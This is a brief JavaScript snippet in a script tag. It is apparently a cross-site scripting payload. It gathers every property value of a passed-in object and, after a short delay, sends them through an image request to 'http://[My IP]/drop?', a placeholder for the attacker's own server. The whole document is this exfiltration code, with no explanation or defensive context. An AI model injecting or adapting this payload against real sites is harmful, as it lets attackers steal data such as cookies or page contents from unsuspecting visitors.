<script>
var target="http://[My IP]/drop?";


function invoke(obj) {
var ref = obj;
   var inner = function() {
      var response = "";

      for(var x in ref ) {
         response += ref[x] + ", ";
      }

      new Image().src=target + escape(response);    
   };
   setTimeout(inner, 100);
}

</script>
